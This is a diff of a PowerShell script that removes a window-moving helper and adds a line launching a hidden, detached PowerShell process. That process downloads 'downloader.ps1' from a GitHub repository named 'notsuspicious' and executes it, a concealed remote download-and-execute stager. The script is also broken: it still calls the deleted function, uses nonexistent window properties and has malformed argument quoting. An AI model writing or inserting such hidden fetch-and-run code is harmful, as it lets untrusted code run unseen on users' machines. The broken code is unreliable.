@@ -1,37 +1,3 @@
-Function Move-Window {
-    param (
-        [string]$ProcessName,
-        [int]$Left,
-        [int]$Top,
-        [int]$Width,
-        [int]$Height
-    )
-
-    $window = Get-Process | Where-Object { $_.MainWindowTitle -eq "$ProcessName" }
-
-    if ($window) {
-        $hwnd = $window.MainWindowHandle
-        $rect = New-Object RECT
-        $user32 = Add-Type -Name user32 -Namespace Win32 -PassThru -MemberDefinition '
-            [DllImport("user32.dll")]
-            public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
-            [DllImport("user32.dll")]
-            public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
-            public struct RECT
-            {
-                public int Left;
-                public int Top;
-                public int Right;
-                public int Bottom;
-            }
-        '
-        $user32::GetWindowRect($hwnd, [ref]$rect)
-        $user32::MoveWindow($hwnd, $Left, $Top, $Width, $Height, $true)
-    } else {
-        Write-Host "$ProcessName window not found."
-    }
-}
-
 # Find existing PowerShell window
 $psWindow = Get-Process -Name powershell | Where-Object { $_.MainWindowTitle -ne "" }
 
@@ -52,11 +18,8 @@ if ($psWindow) {
     $rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 200
     Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
 
-    # Curl parrot.live in the found PowerShell window
-    Invoke-Expression (curl parrot.live)
-
-    # Execute PowerShell command
-    Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content
+    # Start the downloader.ps1 script in a hidden, detached PowerShell window
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden, -NoLogo, -NoNewWindow, -Command `"& { Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content`"}"
 } else {
     Write-Host "PowerShell window not found."
 }
